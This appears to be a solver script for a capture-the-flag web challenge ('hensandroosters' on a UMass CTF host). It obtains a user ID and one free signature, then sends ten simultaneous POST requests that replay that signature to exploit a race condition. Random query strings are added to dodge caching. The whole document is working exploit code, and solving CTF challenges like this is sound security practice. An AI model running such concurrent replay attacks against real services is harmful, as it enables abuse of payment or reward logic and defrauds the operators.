import requests
import string
import random
import threading
import time

url = "http://hensandroosters.crypto.ctf.umasscybersec.org"

sess = requests.Session()

def bypass_qs():
    return "".join(random.choices(string.ascii_letters, k=8))

print("Getting ID...")
r = sess.get(f"{url}/?{bypass_qs()}")
print(r.text)

if "uid is" not in r.text:
    print("Failed to get UID!")
    exit(1)

uid = r.text.split("is ")[1].split("!")[0]
print(f"UID: {uid}")

print("Getting free sig...")
r = sess.get(f"{url}/buy?uid={uid}&abc={bypass_qs()}")
print(r.text)

if "signature:" not in r.text:
    print("Failed to get signature")
    exit(1)

free_sig = r.text.split("signature: ")[1].strip()
print(f"Sig: {free_sig}")

print("Sending concurrent POSTs...")
threads = []
responses = []

def send_req(i):
    post_url = f"{url}/work?bypass={bypass_qs()}"
    try:
        res = sess.post(post_url, json={"uid": uid, "sig": free_sig})
        print(f"Thread {i}: {res.text}")
    except Exception as e:
        print(f"Thread {i} error: {e}")

# We only need 7 studs, so let's send 10 concurrent requests just in case.
for i in range(10):
    t = threading.Thread(target=send_req, args=(i,))
    threads.append(t)
    t.start()
    
for t in threads:
    t.join()

time.sleep(1)
print("Checking studs...")
r = sess.get(f"{url}/buy?uid={uid}&abc={bypass_qs()}")
print(r.text)
